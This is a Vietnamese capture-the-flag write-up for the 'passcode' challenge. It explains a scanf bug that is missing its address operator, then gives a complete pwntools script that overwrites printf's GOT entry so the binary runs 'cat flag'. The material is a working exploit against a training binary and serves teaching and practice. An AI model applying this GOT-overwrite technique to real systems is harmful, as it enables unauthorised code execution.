# passcode

## Phân tích

- Một bài có lỗi hay mắc phải khi code C

```
        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);
```

- `scanf()` nhập vào địa chỉ truyền vào, tuy nhiên khi `scanf("%d", passcode1)` là sẽ lấy giá trị của passcode làm địa chỉ, và passcode nằm trong stack khi ta nhập tên ở hàm `welcome`
- Vậy ta có thể ow giá trị ở passcode1 sau đó sửa giá trị mà giá trị passcode trỏ đến => GOT

## Khai thác

- Ở đây mình chọn hàm printf làm mục tiêu để ow, ta sẽ ow printf@got nhảy vào bên trong hàm if để `cat flag`
- Để chạy được ta phải chạy trên ssh ở ./tmp và ssh dùng python2 nên ta có thể code lại bằng python 2 (hoặc nhờ chatGPT chuyển hộ =)))

```
#!/usr/bin/python3

from pwn import *

exe = ELF('passcode', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x08049358

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
payload = b"A" * 96
sla(b"beta.\n", payload + p32(0x804c010))
sl(str(0x0804926e))
p.interactive()
```
